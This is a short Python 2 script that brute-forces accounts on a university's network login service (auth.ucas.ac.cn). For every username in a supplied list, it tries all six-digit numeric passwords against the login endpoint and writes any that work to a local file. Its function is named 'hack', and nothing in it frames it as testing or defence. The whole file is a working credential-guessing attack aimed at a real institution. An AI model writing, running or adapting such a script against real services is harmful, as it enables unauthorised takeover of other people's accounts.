#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
reload(sys)
sys.setdefaultencoding('utf-8')

import urllib
import urllib2

def main(username,password):
    url= "http://auth.ucas.ac.cn/cgi-bin/do_login"
    body=urllib.urlencode({
        'username':username,
        'password':'{TEXT}%s'%password,
        'drop':3,
        'type':1,
        'n':100
        })
    req = urllib2.Request(url,body)
    reado = urllib2.urlopen(req).read()
    if reado != 'password_error':
        fp = open('%s'%username,"w")
        fp.write(username+"\n"+password)
        fp.close()
        return True
    else :
        return False
def hack(username,pwd,leng):
    base = list('1234567890')
    if leng == 1:
        for a in base:
            #print username+'  '+pwd+a
            if main(username,pwd+a) == True:
                return True
    else:
        for b in base:
            if hack(username,pwd+b,leng-1) == True:
                return True      

if __name__ == "__main__":
    names = [line.rstrip() for line in open("%s"%(sys.argv[1]))]
    for username in names:
        if hack(username,'',6)==True:
            continue
   # username = '201228018629048'
   # hack(username,'123',3)
